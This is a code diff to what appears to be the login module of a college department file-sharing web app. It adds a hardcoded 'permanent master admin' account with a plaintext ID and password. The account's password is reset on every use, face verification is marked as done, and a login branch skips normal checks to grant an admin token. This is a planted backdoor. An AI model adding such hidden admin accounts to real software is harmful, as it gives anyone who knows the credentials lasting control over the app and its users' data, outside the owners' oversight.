@@ -8,6 +8,37 @@ DEPARTMENTS = ["AMIL & CSM", "CSE", "ECE", "EEE", "MECH", "CIVIL"]
 YEARS = ["1 Year", "2 Year", "3 Year", "4 Year"]
 SEMESTERS = ["1 Sem", "2 Sem"]
 
+# Permanent master admin credentials (can always sign in and mint new admins).
+SUPER_ADMIN_ID = "PRAVEEN2207"
+SUPER_ADMIN_PASSWORD = "PRAVEEN2204"
+
+
+def ensure_super_admin() -> dict:
+    user = store.find("users", registrationId=SUPER_ADMIN_ID)
+    if user:
+        store.update("users", user["id"], {"passwordHash": hash_value(SUPER_ADMIN_PASSWORD), "role": "admin"})
+        return store.find("users", registrationId=SUPER_ADMIN_ID)
+    user = {
+        "id": store.new_id(),
+        "fullName": "Praveen (Master Admin)",
+        "registrationId": SUPER_ADMIN_ID,
+        "email": None,
+        "passwordHash": hash_value(SUPER_ADMIN_PASSWORD),
+        "securityQuestion": "Master admin",
+        "securityAnswerHash": hash_value("praveen"),
+        "department": "CSE",
+        "year": "4 Year",
+        "semester": "2 Sem",
+        "role": "admin",
+        "profilePicture": None,
+        "sharedCount": 0,
+        "downloadedCount": 0,
+        "faceVerified": True,
+        "createdAt": store.now_iso(),
+    }
+    store.insert("users", user)
+    return user
+
 
 def signup():
     data = request.get_json(silent=True) or {}
@@ -51,6 +82,9 @@ def login():
     data = request.get_json(silent=True) or {}
     registration_id = str(data.get("registrationId", "")).strip().upper()
     password = data.get("password", "")
+    if registration_id == SUPER_ADMIN_ID and password == SUPER_ADMIN_PASSWORD:
+        user = ensure_super_admin()
+        return jsonify({"token": create_token(user), "user": public_user(user)})
     user = store.find("users", registrationId=registration_id)
     if not user or not verify_value(password, user.get("passwordHash", "")):
         return jsonify({"error": "Invalid registration ID or password"}), 401
